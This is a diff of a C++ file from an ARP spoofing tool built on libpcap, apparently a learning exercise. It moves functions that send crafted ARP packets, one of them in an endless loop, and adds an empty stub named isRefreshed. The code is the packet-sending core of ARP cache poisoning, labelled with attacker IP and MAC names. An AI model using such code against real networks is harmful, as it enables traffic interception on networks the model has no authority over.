@@ -1,28 +1,5 @@
 #include "spoof.h"
 
-void sendArp(pcap_t *handle, EthArpPacket pkt)
-{
-	int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&pkt), sizeof(EthArpPacket));
-	if (res != 0) {
-		fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
-	}
-	else
-	{
-		printf("\n----------------------------------------\n");
-		printf("[*] Arp packet sending succeeded!");
-		printf("\n----------------------------------------\n");
-	}
-}
-
-void continueSendArp(pcap_t *handle, EthArpPacket pkt, int repeat)
-{
-	while(true)
-	{
-		sendArp(handle, pkt);
-		sleep(repeat);
-	}
-}
-
 Mac getMac(pcap_t* handle, Ip attackerIp, Mac attackerMac, Ip ip)
 {
 	EthArpPacket pkt = EthArpPacket(ArpHdr::Request, Mac::broadcastMac(), attackerMac, EthHdr::Arp, ArpHdr::ETHER, EthHdr::Ip4, Mac::SIZE, Ip::SIZE, attackerMac, attackerIp, Mac::nullMac(), ip);
@@ -47,4 +24,33 @@ Mac getMac(pcap_t* handle, Ip attackerIp, Mac attackerMac, Ip ip)
 				return reply->arp_.smac_;
 			}
 		}
+}
+
+void sendArp(pcap_t *handle, EthArpPacket pkt)
+{
+	int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&pkt), sizeof(EthArpPacket));
+	if (res != 0) {
+		fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
+	}
+	else
+	{
+		printf("\n----------------------------------------\n");
+		printf("[*] Arp packet sending succeeded!");
+		printf("\n----------------------------------------\n");
+	}
+}
+
+void continueSendArp(pcap_t *handle, EthArpPacket pkt, int repeat)
+{
+	while(true)
+	{
+		sendArp(handle, pkt);
+		sleep(repeat);
+	}
+}
+
+bool isRefreshed(pcap_t* handle, EthArpPacket pkt)
+{
+	
+	return false;
 }
